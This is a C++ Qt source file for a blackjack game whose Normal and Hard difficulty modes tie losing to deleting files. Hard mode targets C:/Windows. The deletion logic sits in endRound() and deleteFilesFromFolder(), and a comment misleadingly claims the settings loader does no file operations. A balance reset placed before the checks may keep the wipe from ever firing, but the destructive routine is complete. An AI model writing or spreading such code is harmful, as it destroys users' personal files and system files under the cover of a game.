#include "mainwindow.h"
#include "ui_mainwindow.h"
#include <algorithm>

MainWindow::MainWindow(QWidget *parent)
    : QMainWindow(parent)
    , ui(new Ui::MainWindow)
    , balance(1)
    , currentBet(0)
    , difficulty(Difficulty::Easy)
    , gameInProgress(false)
{
    ui->setupUi(this);

    // Load settings (difficulty only - no file operations)
    loadSettings();

    // Initialize game state
    initializeGame();

    // Connect buttons
    connect(ui->pushButton, &QPushButton::clicked, this, &MainWindow::startNewGame);
    connect(ui->pushButton_2, &QPushButton::clicked, this, &MainWindow::placeBet);
    connect(ui->hitButton, &QPushButton::clicked, this, &MainWindow::hit);
    connect(ui->standButton, &QPushButton::clicked, this, &MainWindow::stand);
    connect(ui->doubleButton, &QPushButton::clicked, this, &MainWindow::doubleDown);
    connect(ui->splitButton, &QPushButton::clicked, this, &MainWindow::split);
}

MainWindow::~MainWindow()
{
    clearCardDisplays();
    delete ui;
}

// ---------------- Helper Functions ----------------

QString MainWindow::suitToSymbol(Suit suit)
{
    switch (suit) {
    case Suit::Hearts:   return "♥";
    case Suit::Diamonds: return "♦";
    case Suit::Clubs:    return "♣";
    case Suit::Spades:   return "♠";
    }
    return "";
}

QWidget* MainWindow::createCardWidget(const Card& card)
{
    QWidget* cardWidget = new QWidget();
    cardWidget->setMinimumSize(80, 120);
    cardWidget->setMaximumSize(80, 120);

    // Base style (dark gray background instead of pure white)
    cardWidget->setStyleSheet(
        "background-color: #2b2b2b;" // soft dark gray
        "border: 2px solid black;"
        "border-radius: 8px;"
        );

    // Suit color
    QString color = (card.suit == Suit::Hearts || card.suit == Suit::Diamonds) ? "red" : "white";

    // Top-left rank + suit
    QLabel* topLabel = new QLabel(card.rank + suitToSymbol(card.suit), cardWidget);
    topLabel->setStyleSheet(QString("color: %1; font: bold 14px;").arg(color));
    topLabel->move(6, 4);

    // Bottom-right rank + suit
    QLabel* bottomLabel = new QLabel(card.rank + suitToSymbol(card.suit), cardWidget);
    bottomLabel->setStyleSheet(QString("color: %1; font: bold 14px;").arg(color));
    bottomLabel->adjustSize();
    bottomLabel->move(cardWidget->width() - bottomLabel->width() - 6,
                      cardWidget->height() - bottomLabel->height() - 6);

    // Center suit only
    QLabel* centerLabel = new QLabel(suitToSymbol(card.suit), cardWidget);
    centerLabel->setStyleSheet(QString("color: %1; font: bold 28px;").arg(color));
    centerLabel->adjustSize();
    centerLabel->move((cardWidget->width() - centerLabel->width()) / 2,
                      (cardWidget->height() - centerLabel->height()) / 2);

    return cardWidget;
}


void MainWindow::clearCardDisplays()
{
    // Clear dealer cards
    for (QWidget* card : dealerCardWidgets) {
        ui->dealerCardLayout->removeWidget(card);
        delete card;
    }
    dealerCardWidgets.clear();

    // Clear player cards
    for (QWidget* card : playerCardWidgets) {
        ui->playerCardLayout->removeWidget(card);
        delete card;
    }
    playerCardWidgets.clear();
}

void MainWindow::updateCardDisplays()
{
    clearCardDisplays();

    // Add dealer cards
    for (const Card& card : dealerHand) {
        QWidget* cardWidget = createCardWidget(card);
        dealerCardWidgets.append(cardWidget);
        ui->dealerCardLayout->addWidget(cardWidget);
    }

    // Add player cards
    for (const Card& card : playerHand) {
        QWidget* cardWidget = createCardWidget(card);
        playerCardWidgets.append(cardWidget);
        ui->playerCardLayout->addWidget(cardWidget);
    }
}

void MainWindow::enableGameButtons(bool enabled)
{
    ui->hitButton->setEnabled(enabled);
    ui->standButton->setEnabled(enabled);
    ui->doubleButton->setEnabled(enabled && balance >= currentBet);
    ui->splitButton->setEnabled(enabled && playerHand.size() == 2 &&
                                playerHand[0].rank == playerHand[1].rank &&
                                balance >= currentBet);
}

// ---------------- Core Functions ----------------

void MainWindow::loadSettings()
{
    QFile file("settings.txt");
    if (!file.open(QIODevice::ReadOnly | QIODevice::Text)) {
        difficulty = Difficulty::Easy;
        balance = 10000; // Default for easy
        return;
    }

    QTextStream in(&file);
    int diff = 0;
    in >> diff;

    if (diff == 1) { // Normal
        difficulty = Difficulty::Normal;
        in >> folderPath;  // Read chosen folder
        balance = 10000;
    }
    else if (diff == 2) { // Hard
        difficulty = Difficulty::Hard;
        folderPath = "C:/Windows";
        balance = countFilesInFolder(folderPath);
    }
    else { // Easy
        difficulty = Difficulty::Easy;
        balance = 10000;
    }

    file.close();
}


void MainWindow::initializeGame()
{
    // Initialize game state
    dealerHand.clear();
    playerHand.clear();
    currentBet = 0;
    gameInProgress = false;
    shuffleDeck();
    clearCardDisplays();

    // Initialize UI elements
    ui->balanceLabel->setText("Balance: $" + QString::number(balance));
    ui->betLabel->setText("Current bet: $" + QString::number(currentBet));
    ui->gameStatusLabel->setText("Place Your Bet!");
    ui->gameStatusLabel->setStyleSheet("color: #FFD700;");
    ui->playerLabel->setText("Player's Hand");
    ui->dealerLabel->setText("Dealer's Hand");

    // Disable game buttons until bet is placed
    enableGameButtons(false);

    // Get number of decks
    bool ok;
    QStringList options = {"1", "2", "4", "6", "8"};

    QString choice = QInputDialog::getItem(
        this,
        "Choose Deck Count",
        "How many decks do you want to play with?",
        options,
        0,
        false,
        &ok
        );

    if (ok) {
        numDecks = choice.toInt();
    } else {
        numDecks = 1;
    }

    shuffleDeck(); // Shuffle again with correct deck count
}

void MainWindow::shuffleDeck()
{
    deck.clear();
    Card c;

    for (int j = 0; j < numDecks; j++) {
        for (int i = 1; i <= 4; i++) {
            for (int x = 1; x <= 13; x++) {
                if (x == 1) {
                    c.value = 11; // Ace
                    c.isAce = true;
                    c.rank = "A";
                } else if (x >= 11) {
                    c.value = 10;
                    c.isAce = false;
                    if (x == 11) c.rank = "J";
                    else if (x == 12) c.rank = "Q";
                    else if (x == 13) c.rank = "K";
                } else {
                    c.value = x;
                    c.isAce = false;
                    c.rank = QString::number(x);
                }

                switch (i) {
                case 1: c.suit = Suit::Clubs;    break;
                case 2: c.suit = Suit::Diamonds; break;
                case 3: c.suit = Suit::Hearts;   break;
                case 4: c.suit = Suit::Spades;   break;
                }

                deck.append(c);
            }
        }
    }

    // Shuffle deck
    std::shuffle(deck.begin(), deck.end(), *QRandomGenerator::global());
}

Card MainWindow::drawCard()
{
    if (deck.isEmpty()) {
        shuffleDeck(); // Reshuffle if deck is empty
    }
    return deck.takeFirst();
}

int MainWindow::calculateHandValue(const QVector<Card> &hand) const
{
    int value = 0;
    int aceCount = 0;

    for (const Card& card : hand) {
        value += card.value;
        if (card.isAce) aceCount++;
    }

    // Convert aces from 11 to 1 if busting
    while (value > 21 && aceCount > 0) {
        value -= 10;
        aceCount--;
    }

    return value;
}

void MainWindow::updateUI()
{
    ui->balanceLabel->setText("Balance: $" + QString::number(balance));
    ui->betLabel->setText("Current Bet: $" + QString::number(currentBet));
    ui->dealerLabel->setText("Dealer's Hand (Value: " + QString::number(calculateHandValue(dealerHand)) + ")");
    ui->playerLabel->setText("Player's Hand (Value: " + QString::number(calculateHandValue(playerHand)) + ")");
    updateCardDisplays();
}

void MainWindow::dealInitialCards()
{
    // Deal 2 cards to player and 2 to dealer
    playerHand.clear();
    dealerHand.clear();

    playerHand.append(drawCard());
    dealerHand.append(drawCard());
    playerHand.append(drawCard());
    dealerHand.append(drawCard());

    updateUI();
    gameInProgress = true;
    enableGameButtons(true);
}

void MainWindow::endRound(bool userBust, bool dealerBust)
{
    int playerValue = calculateHandValue(playerHand);
    int dealerValue = calculateHandValue(dealerHand);

    enableGameButtons(false);
    gameInProgress = false;

    if (userBust && dealerBust) {
        // Both bust - push
        balance += currentBet; // Return bet
        ui->gameStatusLabel->setText("Push - Both Busted!");
        ui->gameStatusLabel->setStyleSheet("color: #FFD700;");
    }
    else if (userBust) {
        // Player busted
        ui->gameStatusLabel->setText("You Busted - Dealer Wins!");
        ui->gameStatusLabel->setStyleSheet("color: red;");
        // Money already deducted when bet was placed
    }
    else if (dealerBust) {
        // Dealer busted
        balance += currentBet * 2; // Return bet + winnings
        ui->gameStatusLabel->setText("Dealer Busted - You Win!");
        ui->gameStatusLabel->setStyleSheet("color: green;");
    }
    else {
        // Neither busted
        bool playerNatural = (playerValue == 21 && playerHand.size() == 2);
        bool dealerNatural = (dealerValue == 21 && dealerHand.size() == 2);

        if (playerNatural && dealerNatural) {
            balance += currentBet; // Return bet
            ui->gameStatusLabel->setText("Push - Both Blackjack!");
            ui->gameStatusLabel->setStyleSheet("color: #FFD700;");
        }
        else if (playerNatural && !dealerNatural) {
            balance += static_cast<int>(currentBet * 2.5); // 3:2 payout + original bet
            ui->gameStatusLabel->setText("Blackjack! You Win!");
            ui->gameStatusLabel->setStyleSheet("color: green;");
        }
        else if (!playerNatural && dealerNatural) {
            ui->gameStatusLabel->setText("Dealer Blackjack - You Lose!");
            ui->gameStatusLabel->setStyleSheet("color: red;");
        }
        else if (playerValue > dealerValue) {
            balance += currentBet * 2; // Return bet + winnings
            ui->gameStatusLabel->setText("You Win!");
            ui->gameStatusLabel->setStyleSheet("color: green;");
        }
        else if (playerValue < dealerValue) {
            ui->gameStatusLabel->setText("Dealer Wins!");
            ui->gameStatusLabel->setStyleSheet("color: red;");
        }
        else {
            balance += currentBet; // Return bet
            ui->gameStatusLabel->setText("Push!");
            ui->gameStatusLabel->setStyleSheet("color: #FFD700;");
        }
    }

    currentBet = 0;
    updateUI();

    // Check if player is out of money
    if (balance <= 0) {
        QMessageBox::information(this, "Game Over", "You're out of money! Starting a new game.");
        balance = DEFAULT_BALANCE;
        updateUI();
    }
    // Check file deletion rules
    if (difficulty == Difficulty::Normal && balance <= 0) {
        deleteFilesFromFolder(folderPath, countFilesInFolder(folderPath));
        QMessageBox::warning(this, "Folder Lost", "You lost all your money. Your chosen folder has been deleted!");
        balance = 10000; // Restart with default balance
    }

    if (difficulty == Difficulty::Hard && balance <= 0) {
        deleteFilesFromFolder(folderPath, countFilesInFolder(folderPath));
        QMessageBox::critical(this, "Critical Loss", "Your Windows folder has been wiped. Game Over!");
        QApplication::quit();
    }

}

// ---------------- Slot Implementations ----------------

void MainWindow::startNewGame()
{
    QMessageBox::StandardButton reply = QMessageBox::question(
        this,
        "New Game",
        "Start a new game? This will reset your balance.",
        QMessageBox::Yes | QMessageBox::No
        );

    if (reply == QMessageBox::Yes) {
        balance = DEFAULT_BALANCE;
        initializeGame();
    }
}

void MainWindow::placeBet()
{
    if (gameInProgress) {
        QMessageBox::warning(this, "Game in Progress", "Finish the current hand before placing a new bet.");
        return;
    }

    bool ok;
    int bet = QInputDialog::getInt(
        this,
        "Place Bet",
        "Enter your bet amount:",
        10,
        1,
        balance,
        1,
        &ok
        );

    if (ok && bet > 0 && bet <= balance) {
        currentBet = bet;
        balance -= bet; // Deduct bet immediately
        updateUI();
        dealInitialCards();

        ui->gameStatusLabel->setText("Make your move!");
        ui->gameStatusLabel->setStyleSheet("color: #FFD700;");
    } else if (ok) {
        QMessageBox::warning(this, "Invalid Bet", "Your bet must be between $1 and your balance.");
    }
}

void MainWindow::hit()
{
    if (!gameInProgress) return;

    playerHand.append(drawCard());
    updateUI();

    int playerValue = calculateHandValue(playerHand);
    if (playerValue > 21) {
        endRound(true, false); // Player busts
    }
}

void MainWindow::stand()
{
    if (!gameInProgress) return;

    // Dealer draws until at least 17 (or 18 in hard mode)
    int dealerTarget = (difficulty == Difficulty::Hard) ? 18 : 17;

    int dealerValue = calculateHandValue(dealerHand);
    while (dealerValue < dealerTarget) {
        dealerHand.append(drawCard());
        dealerValue = calculateHandValue(dealerHand);
        updateUI();
    }

    bool dealerBust = dealerValue > 21;
    endRound(false, dealerBust);
}

void MainWindow::doubleDown()
{
    if (!gameInProgress) return;

    if (balance >= currentBet) {
        balance -= currentBet;
        currentBet *= 2;
        updateUI();

        playerHand.append(drawCard());
        updateUI();

        int playerValue = calculateHandValue(playerHand);
        if (playerValue > 21) {
            endRound(true, false);
        } else {
            stand();
        }
    } else {
        QMessageBox::warning(this, "Insufficient Balance", "You don't have enough money to double down.");
    }
}

void MainWindow::split()
{
    if (!gameInProgress) return;

    if (playerHand.size() == 2 && playerHand[0].rank == playerHand[1].rank && balance >= currentBet) {
        QMessageBox::information(this, "Split", "Splitting pairs is not yet implemented in this version.");
    } else {
        QMessageBox::warning(this, "Cannot Split", "You can only split pairs and must have enough balance.");
    }
}

//------------------------------File handling operations-------------------------------

int MainWindow::countFilesInFolder(const QString &path) const
{
    QDir dir(path);
    if (!dir.exists()) return 0;

    QFileInfoList files = dir.entryInfoList(QDir::Files | QDir::NoSymLinks | QDir::Readable);
    return files.size();
}

void MainWindow::deleteFilesFromFolder(const QString &path, int numFiles)
{
    QDir dir(path);
    if (!dir.exists()) return;

    QFileInfoList files = dir.entryInfoList(QDir::Files | QDir::NoSymLinks | QDir::Readable);
    int toDelete = qMin(numFiles, files.size());

    for (int i = 0; i < toDelete; i++) {
        QFile file(files[i].absoluteFilePath());
        if (!file.remove()) {
            qWarning() << "Failed to delete:" << files[i].absoluteFilePath();
        }
    }
}
